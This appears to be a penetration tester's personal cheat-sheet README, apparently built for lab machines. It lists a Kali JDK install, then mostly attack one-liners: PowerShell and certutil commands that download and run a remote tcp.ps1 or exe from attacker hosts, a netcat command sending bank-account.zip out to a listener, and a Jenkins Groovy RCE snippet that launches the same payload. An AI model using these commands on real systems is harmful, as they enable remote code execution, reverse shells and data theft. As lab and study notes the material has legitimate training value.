# PITA-commands-and-setups
Collection of pain in the ass commands which take a bit of googling to find the successful setup





```Installing jdk-8 in kali 2020.X```
- $ sudo apt-get install openjdk-8-jdk
- $ echo "deb http://ftp.us.debian.org/debian sid main" >> /etc/apt/sources.list
- $ apt-get update && apt-get upgrade
- $ sudo apt-get install openjdk-8-jdk
- $ sudo update-alternatives --config java

```linux b64 -> NT utf-16le b64```
- $ echo 'command here' | iconv -t utf-16le | base64 -w 0

```shellings```
- Invoke-WebRequest –Outfile C:\\Windows\\System32\\spool\\drivers\\color\\tcp.ps1 -Uri http://10.10.14.11/tcp.ps1
- powershell -NoP -ExecutionPolicy Bypass –c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/tcp.ps1')
- certutil.exe -urlcache -split -f "http://ATTACKER/FCUpdateService.exe" FCUpdateService.exe

```pwsh paths```
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
- C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe 

```nc.exe file transfers```
- \\\\192.168.119.135\nc.exe -w 3 192.168.119.135 9001 < c:\bank-account.zip 
- nc -lvp 9001 > bank-account.zip 

```jenkins RCE```
- def command = "powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/tcp.ps1')" 
- def proc = command.execute() 
- println(proc.in.text)
